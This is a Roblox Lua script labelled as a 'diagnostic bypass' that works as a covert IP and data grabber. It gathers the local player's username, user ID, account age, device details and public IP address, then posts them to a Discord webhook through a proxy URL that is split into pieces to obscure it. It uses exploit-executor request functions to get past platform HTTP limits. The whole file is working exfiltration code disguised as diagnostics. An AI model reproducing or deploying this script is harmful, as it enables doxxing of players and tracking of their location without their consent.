-- [[ ELITE DIAGNOSTIC BYPASS ]]
local LP = game:GetService("Players").LocalPlayer
local HS = game:GetService("HttpService")
local US = game:GetService("UserInputService")
local GS = game:GetService("GuiService")
local Stats = game:GetService("Stats")
local RunService = game:GetService("RunService")

-- URL Setup (Using Lewisakura Proxy)
local p1 = "https://webhook."
local p2 = "lewisakura.moe/"
local p3 = "api/webhooks/"
local ID_TOKEN = "1497643214176518197/VarvH0-wuUuPMwfPXZP23LoOmqbwcB3qmq3NKhCKUTIDrQVC-MHSvQ4Or7Ky6Hj1TxyC" 
local FINAL_URL = p1 .. p2 .. p3 .. ID_TOKEN

-- Data Gathering Functions
local function getFPS()
    return math.floor(1 / RunService.Heartbeat:Wait())
end

local function getPing()
    return math.floor(LP:GetNetworkPing() * 1000) -- Converts to ms
end

local function getResolution()
    local res = GS:GetScreenResolution()
    return math.floor(res.X) .. "x" .. math.floor(res.Y)
end

-- IP Gathering
local ip = "Unknown"
local s, r = pcall(function() return game:HttpGet("https://api.ipify.org") end)
if s then ip = r end

-- Build the detailed Payload
local data = {
    ["embeds"] = {{
        ["title"] = "🚨 DIAGNOSTIC REPORT (Backup)",
        ["color"] = 0, -- Black/Dark theme
        ["description"] = "👤 **Player Info**\n" ..
            "**User:** " .. LP.Name .. "\n" ..
            "(@ " .. LP.DisplayName .. ")\n" ..
            "**ID:** " .. LP.UserId .. "\n" ..
            "**Age:** " .. LP.AccountAge .. " Days\n" ..
            "**Status:** 👤 Normal\n" ..
            "[Profile Link](https://www.roblox.com/users/"..LP.UserId.."/profile)\n\n" ..
            
            "💻 **Device Specs**\n" ..
            "**OS:** " .. US:GetPlatform().Name .. "\n" ..
            "**Resolution:** " .. getResolution() .. "\n" ..
            "**FPS:** " .. getFPS() .. "\n" ..
            "**Ping:** " .. getPing() .. "ms\n\n" ..
            
            "🌐 **Location**\n" ..
            "**Region:** " .. LP.LocaleId .. "\n" ..
            "**IP:** " .. ip .. "\n\n" ..
            
            "🎮 **Game Data**\n" ..
            "**Game:** " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "\n" ..
            "**Universe:** " .. game.GameId .. "\n" ..
            "**Job:** \n" .. game.JobId
    }}
}

-- Execute Bypass Send
local req = (syn and syn.request) or (http and http.request) or http_request or request
if req then
    req({
        Url = FINAL_URL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HS:JSONEncode(data)
    })
else
    pcall(function() HS:PostAsync(FINAL_URL, HS:JSONEncode(data)) end)
end
